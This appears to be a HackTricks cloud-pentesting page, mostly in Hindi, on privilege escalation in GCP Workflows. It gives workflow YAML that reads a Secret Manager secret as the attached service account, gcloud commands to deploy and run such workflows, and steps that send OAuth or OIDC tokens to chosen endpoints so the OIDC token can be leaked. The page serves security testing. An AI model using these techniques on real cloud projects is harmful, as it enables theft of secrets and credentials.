# GCP - Workflows Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Workflows

बुनियादी जानकारी:

{{#ref}}
../gcp-services/gcp-workflows-enum.md
{{#endref}}

### `workflows.workflows.create`, `iam.serviceAccounts.ActAs`, `workflows.executions.create`, (`workflows.workflows.get`, `workflows.operations.get`)

जहाँ तक मुझे पता है, Workflow से जुड़ी SA की क्रेडेंशियल्स वाले metadata endpoint तक पहुँच देने वाला shell प्राप्त करना संभव नहीं है। हालाँकि, Workflow के अंदर निष्पादित करने के लिए actions जोड़कर SA की permissions का दुरुपयोग करना संभव है।

Connectors का documentation पाया जा सकता है। उदाहरण के लिए, यह [**page of the Secretmanager connector**](https://cloud.google.com/workflows/docs/reference/googleapis/secretmanager/Overview)**.** साइडबार में कई अन्य connectors मिल सकते हैं।

और यहाँ आप एक connector का उदाहरण पा सकते हैं जो secret को print करता है:

<details><summary>Workflow YAML configuration to access secrets</summary>
```yaml
main:
params: [input]
steps:
- access_string_secret:
call: googleapis.secretmanager.v1.projects.secrets.versions.accessString
args:
secret_id: secret_name
version: 1
project_id: project-id
result: str_secret
- returnOutput:
return: "${str_secret}"
```
</details>

CLI से अपडेट:

<details><summary>CLI से Deploy और Execute workflows</summary>
```bash
gcloud workflows deploy <workflow-name> \
--service-account=email@SA \
--source=/path/to/config.yaml \
--location us-central1
```
यदि आपको `ERROR: (gcloud.workflows.deploy) FAILED_PRECONDITION: Workflows service agent does not exist` जैसी त्रुटि मिलती है, तो बस **एक मिनट प्रतीक्षा करें और फिर से प्रयास करें**।

यदि आपके पास वेब एक्सेस नहीं है तो Workflow के execution को trigger करके देखना संभव है:
```bash
# Run execution with output
gcloud workflows run <workflow-name> --location us-central1

# Run execution without output
gcloud workflows execute <workflow-name> --location us-central1

# List executions
gcloud workflows executions list <workflow-name>

# Get execution info and output
gcloud workflows executions describe projects/<proj-number>/locations/<location>/workflows/<workflow-name>/executions/<execution-id>
```
</details>

> [!CAUTION]
> आप पिछले निष्पादनों के आउटपुट को संवेदनशील जानकारी देखने के लिए भी जांच सकते हैं

ध्यान दें कि भले ही आपको `PERMISSION_DENIED: Permission 'workflows.operations.get' denied on...` जैसा error मिले क्योंकि आपके पास वह permission नहीं है, workflow जनरेट हो चुका होता है।

### Leak OIDC token (and OAuth?)

According [**to the docs**](https://cloud.google.com/workflows/docs/authenticate-from-workflow) it's possible to use workflow steps that will send an HTTP request with the OAuth or OIDC token. However, just like in the case of [Cloud Scheduler](gcp-cloudscheduler-privesc.md), the HTTP request with the Oauth token must be to the host `.googleapis.com`.

> [!CAUTION]
> इसलिए, यह **संभव है कि आप एक HTTP endpoint इंगित करके OIDC token को leak कर सकते हैं** जो user द्वारा नियंत्रित हो, परंतु OAuth token को leak करने के लिए आपको उस सुरक्षा के लिए **bypass** की आवश्यकता होगी। फिर भी, आप किसी भी **GCP api** को **contact** करके **SA** की ओर से कार्रवाई कर सकते हैं, चाहे वह connectors हों या OAuth token के साथ HTTP requests हों।

#### Oauth

<details><summary>Workflow HTTP request with OAuth token</summary>
```yaml
- step_A:
call: http.post
args:
url: https://compute.googleapis.com/compute/v1/projects/myproject1234/zones/us-central1-b/instances/myvm001/stop
auth:
type: OAuth2
scopes: OAUTH_SCOPE
```
</details>#### OIDC

<details><summary>Workflow HTTP अनुरोध जिसमें OIDC token हो</summary>
```yaml
- step_A:
call: http.get
args:
url: https://us-central1-project.cloudfunctions.net/functionA
query:
firstNumber: 4
secondNumber: 6
operation: sum
auth:
type: OIDC
audience: OIDC_AUDIENCE
```
</details>### `workflows.workflows.update` ...

इस अनुमति के साथ, `workflows.workflows.create` की बजाय पहले से मौजूद एक workflow को अपडेट करना और वही attacks करना संभव है।

{{#include ../../../banners/hacktricks-training.md}}
